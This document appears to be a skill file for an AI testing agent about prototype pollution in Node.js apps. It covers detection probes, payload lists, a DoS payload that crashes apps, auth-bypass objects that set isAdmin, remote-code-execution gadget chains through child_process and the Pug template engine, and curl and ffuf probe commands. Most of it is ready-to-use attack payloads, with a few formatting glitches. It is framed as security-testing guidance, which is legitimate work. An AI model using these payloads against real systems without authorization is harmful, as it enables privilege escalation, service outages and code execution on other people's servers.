---
name: prototype-pollution
description: Prototype pollution detection and exploitation in Node.js/JavaScript apps — __proto__/constructor.prototype injection via JSON merge, query params, and imports; RCE chains via gadget properties; SSTI escalation. Use when testing any app using lodash.merge, deepmerge, or JSON.parse on user input.
category: injection
---

# Prototype Pollution

## Detection
- **Query/body param pollution**: `?__proto__[isAdmin]=true`, `{"__proto__":{"isAdmin":true}}` in JSON body, `constructor.prototype` variants.
- **Key sources**: `JSON.parse` on request body, `lodash.merge`/`_.defaultsDeep`, `deepmerge`, `merge-deep`, `extend`, `qs` (qs allows `__proto__` by default), query-string, dot-prop.
- Probe: send `{"__proto__":{"polluted":"true"}}` then request `Object.prototype.polluted` via a reflection endpoint or check response header echo.

## Exploitation
1. **DoS (polluted)*`*`: set `{"__proto__":{"toString":"1"}}` → app crashes on next string op.
2. **Auth bypass**: `{"__proto__":{"isAdmin":true,"role":"admin","verified":true}}` on signup/login JSON.
3. **RCE (known gadget chains)**:
   - `child_process.execSync`: `{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}`
   - Pug template engine: `{"__proto__":{"client":true,"__proto__":{"pretty":true}}}` + `{"__proto__":{"block":{"type":"Text","line":"process.mainModule.require('child_process').execSync('id')"}}}`
   - Handlebars/Express res.render gadget.
4. **Merge via __proto__ in arrays**: `{"a":[{"__proto__":{"x":1}}]}`.

## Payloads
```
{"__proto__":{"polluted":"true"}}
{"constructor":{"prototype":{"polluted":"true"}}}
{"__proto__":{"__proto__":{"polluted":"true"}}}
?__proto__.isAdmin=true
?__proto__[isAdmin]=true
```

## Tool Commands (Windows)
```powershell
# detect with ffuf wordlist of pollution params (if ffuf available)
# ffuf -w <target>/params -X POST -u $U/api/merge -d '{"__proto__":{"polluted":"true"}}' -H 'Content-Type: application/json'
# verify by echoing back a merged field
curl.exe -s "$U/?__proto__[x]=1" -X POST -d '{"name":"a"}' | Select-String -Pattern 'x":'
```

## Verification & Evidence
- Must show: polluted property visible in a server-rendered object/header, OR behavioral change (crash / auth bypass / RCE).
- Save request.txt + response.txt + reproduce.ps1 under `evidence/F-<id>/`.